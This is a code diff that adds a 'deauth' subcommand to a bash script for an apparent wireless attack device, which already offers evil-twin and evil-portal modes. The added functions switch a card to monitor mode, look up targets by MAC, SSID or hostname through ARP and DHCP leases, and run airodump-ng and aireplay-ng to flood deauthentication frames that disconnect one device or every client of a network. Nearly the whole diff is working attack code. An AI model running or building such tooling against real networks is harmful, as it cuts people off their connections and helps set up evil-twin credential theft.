@@ -37,6 +37,10 @@ function print_help() {
     echo "  evil_twin           Enable internet passthrough from AP to WiFi"
     echo "  evil_portal [stop]  Enable/disable evil portal the AP"
     echo "  kismet <iface|stop> Enable/disable Kismet"
+    echo "  deauth <target>     Deauth clients from networks"
+    echo "    <SSID>            Disconnect all clients from specified network"
+    echo "    <MAC>             Disconnect specific device by MAC address"
+    echo "    <hostname>        Disconnect device by hostname (same network only)"
     echo "  test_inet           Ping google.com"
     echo "  get                 Get currently set parameters"
     echo "  script"
@@ -267,6 +271,155 @@ function ssh() {
     bh wifi ip
 }
 
+function get_monitor_interface() {
+    # Get the 5GHz interface for monitor mode (prefer USB dongle)
+    MONITOR_NIC=$(bh wifi dev | grep "5GHz" | awk '{print $1}' | grep wlan | head -n1)
+    if [ -z "$MONITOR_NIC" ]; then
+        # Fallback to any available interface
+        MONITOR_NIC=$(bh wifi dev | awk '{print $1}' | grep wlan | head -n1)
+    fi
+    echo $MONITOR_NIC
+}
+
+function setup_monitor_mode() {
+    local iface=$1
+    echo "Setting up monitor mode on $iface..."
+    
+    # Set to monitor mode
+    iw dev $iface set type monitor 2>/dev/null
+    if [ $? -ne 0 ]; then
+        echo "Failed to set monitor mode on $iface"
+        return 1
+    fi
+    
+    # Bring interface up
+    ip link set $iface up
+    echo "Monitor mode enabled on $iface"
+    return 0
+}
+
+function find_target_info() {
+    local target="$1"
+    local current_ssid=""
+    local current_bssid=""
+    
+    # Get current network info if connected
+    local connected_iface=$(cat /run/inet_nic 2>/dev/null)
+    if [ -n "$connected_iface" ]; then
+        current_ssid=$(iw dev $connected_iface link | grep SSID | awk '{print $2}')
+        current_bssid=$(iw dev $connected_iface link | grep "Connected to" | awk '{print $3}')
+    fi
+    
+    # Check if target looks like a MAC address
+    if [[ $target =~ ^([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})$ ]]; then
+        echo "mac:$target"
+        return 0
+    fi
+    
+    # Check if target matches current SSID
+    if [ "$target" = "$current_ssid" ]; then
+        echo "ssid:$target:$current_bssid"
+        return 0
+    fi
+    
+    # Try to resolve hostname on current network
+    if [ -n "$connected_iface" ] && [ -n "$current_ssid" ]; then
+        # Try ARP table lookup
+        local target_mac=$(arp -a | grep "$target" | awk '{print $4}' | head -n1)
+        if [ -n "$target_mac" ]; then
+            echo "hostname:$target:$target_mac:$current_bssid"
+            return 0
+        fi
+        
+        # Try DHCP lease lookup if available
+        if [ -f /var/lib/dhcp/dhcpd.leases ]; then
+            target_mac=$(grep -A4 "client-hostname \"$target\"" /var/lib/dhcp/dhcpd.leases | grep "hardware ethernet" | awk '{print $3}' | tr -d ';' | head -n1)
+            if [ -n "$target_mac" ]; then
+                echo "hostname:$target:$target_mac:$current_bssid"
+                return 0
+            fi
+        fi
+    fi
+    
+    echo "unknown:$target"
+    return 1
+}
+
+function deauth_attack() {
+    check $1
+    local target="$1"
+    local count="${2:-10}"
+    
+    echo "Analyzing target: $target"
+    
+    # Get monitor interface
+    local monitor_iface=$(get_monitor_interface)
+    if [ -z "$monitor_iface" ]; then
+        echo "Error: No suitable wireless interface found"
+        return 1
+    fi
+    
+    # Setup monitor mode
+    setup_monitor_mode $monitor_iface
+    if [ $? -ne 0 ]; then
+        return 1
+    fi
+    
+    # Analyze target
+    local target_info=$(find_target_info "$target")
+    local target_type=$(echo $target_info | cut -d: -f1)
+    
+    case "$target_type" in
+        "mac")
+            local target_mac=$(echo $target_info | cut -d: -f2)
+            echo "Deauthenticating MAC: $target_mac"
+            echo "Scanning for target..."
+            
+            # Quick scan to find which network the MAC is on
+            timeout 10 airodump-ng $monitor_iface --write /tmp/deauth_scan --output-format csv >/dev/null 2>&1
+            local target_bssid=$(grep "$target_mac" /tmp/deauth_scan-01.csv 2>/dev/null | cut -d, -f6 | head -n1)
+            
+            if [ -n "$target_bssid" ]; then
+                echo "Found target on network: $target_bssid"
+                aireplay-ng --deauth $count -a "$target_bssid" -c "$target_mac" $monitor_iface
+            else
+                echo "Error: Could not locate target MAC address"
+                return 1
+            fi
+            ;;
+            
+        "ssid")
+            local target_ssid=$(echo $target_info | cut -d: -f2)
+            local target_bssid=$(echo $target_info | cut -d: -f3)
+            echo "Deauthenticating all clients from SSID: $target_ssid"
+            echo "BSSID: $target_bssid"
+            aireplay-ng --deauth $count -a "$target_bssid" $monitor_iface
+            ;;
+            
+        "hostname")
+            local hostname=$(echo $target_info | cut -d: -f2)
+            local target_mac=$(echo $target_info | cut -d: -f3)
+            local target_bssid=$(echo $target_info | cut -d: -f4)
+            echo "Deauthenticating hostname: $hostname"
+            echo "MAC: $target_mac, Network: $target_bssid"
+            aireplay-ng --deauth $count -a "$target_bssid" -c "$target_mac" $monitor_iface
+            ;;
+            
+        "unknown")
+            echo "Error: Cannot resolve target '$target'"
+            echo "Options:"
+            echo "  - Use MAC address format (aa:bb:cc:dd:ee:ff)"
+            echo "  - Use SSID name (must be connected to network)"
+            echo "  - Use hostname (must be on same network)"
+            return 1
+            ;;
+    esac
+    
+    # Cleanup
+    rm -f /tmp/deauth_scan* 2>/dev/null
+    echo "Deauth attack completed"
+}
+
 subcommand=$1; shift
 case "$subcommand" in
     set)
@@ -290,6 +443,9 @@ case "$subcommand" in
         ;;
     kismet)
         bh_kismet "$@"
+        ;;
+    deauth)
+        deauth_attack "$@"
         ;;
     test_inet)
         ping google.com -w 3
